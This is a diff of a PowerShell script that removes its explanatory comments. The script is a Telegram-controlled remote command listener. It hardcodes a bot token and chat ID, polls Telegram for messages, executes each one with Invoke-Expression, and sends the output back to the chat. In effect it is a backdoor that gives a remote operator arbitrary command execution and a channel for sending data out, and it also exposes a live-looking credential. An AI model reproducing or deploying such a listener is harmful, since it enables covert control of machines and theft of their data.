@@ -1,4 +1,3 @@
-# Replace these with your bot's token and chat ID
 $Token = '7605640104:AAGYHhbE725OkE8bEbgFPSzROWp8zcDvXow'
 $ChatId = '6601089119'
 
@@ -31,10 +30,8 @@ function Get-Updates {
     }
 }
 
-# Initialize last_update_id
 $lastUpdateId = 0
 
-# Notify start
 Send-Message "PowerShell listener started and listening for commands."
 
 while ($true) {
@@ -62,7 +59,6 @@ while ($true) {
             if ($messageText) {
                 Write-Output "Received command: $messageText"
 
-                # Execute the command
                 try {
                     $output = Invoke-Expression -Command $messageText 2>&1
                     $outputText = $output -join "`n"
@@ -70,8 +66,6 @@ while ($true) {
                     $outputText = $_.Exception.Message
                 }
 
-                # Send back the output (split if too long)
-                # Telegram message limit is 4096 characters
                 $maxLength = 4000
                 for ($i = 0; $i -lt $outputText.Length; $i += $maxLength) {
                     $chunk = $outputText.Substring($i, [Math]::Min($maxLength, $outputText.Length - $i))
